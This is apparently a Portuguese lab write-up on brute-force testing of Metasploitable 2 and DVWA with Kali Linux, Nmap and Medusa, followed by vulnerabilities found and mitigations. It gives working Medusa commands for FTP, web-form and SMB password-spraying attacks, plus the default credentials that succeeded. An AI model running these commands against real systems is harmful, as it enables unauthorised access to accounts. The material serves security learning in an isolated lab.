Teste de Forca Bruta com Kali Linux e Medusa

Simulei ataques de forca bruta em um ambiente controlado.
O foco foi entender como sistemas vulneraveis respondem a tentativas de acesso.

Ambiente

• Kali Linux
• Metasploitable 2
• VirtualBox
• Rede Host-Only

Etapa 1 - Teste de conectividade

Realizei teste de comunicacao entre as maquinas.

Resultado: Ping ip

Etapa 2 - Enumeracao

Identifiquei portas e servicos ativos com Nmap.

Resultado: Enumeracao Nmap

Etapa 3 - Wordlists

Criei listas simples de usuarios e senhas.

Resultado: Wordlists

Etapa 4 - Ataque FTP

Executei ataque de forca bruta no servico FTP.

Resultado: Ataque FTP

Etapa 5 - Ataque Login Web

Realizei ataque no formulario de login do DVWA.

Resultado: DVWA ataque

Etapa 6 - Ataque SMB

Executei password spraying no servico SMB.

Resultado: Ataque smb

Etapa 7 - Validacao de acesso

Confirmei acesso com credenciais validas.

Resultado: ataque smb

Resultados

Consegui acesso aos servicos com credenciais fracas.

Exemplo:  Ataque ftp

• Usuario: msfadmin
• Senha: msfadmin

Vulnerabilidades

• Senhas fracas
• Sem limite de tentativas
• Sem bloqueio de conta
• Sem monitoramento

Mitigacao

• Senhas fortes
• MFA
• Limite de tentativas
• Monitoramento de logs
• Bloqueio por IP

Comandos utilizados

nmap -sV 192.168.135.3

medusa -h 192.168.135.3 -U users.txt -P pass.txt -M ftp

medusa -h 192.168.135.3 -U users.txt -P pass.txt -M http
-m PAGE:'/dvwa/login.php'
-m FORM:'username=^USER^&password=^PASS^&Login=Login'
-m 'FAIL=Login failed' -t 6

medusa -h 192.168.135.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Conclusao

O ambiente demonstrou como ataques simples funcionam.
Sistemas sem protecao sao comprometidos rapidamente.
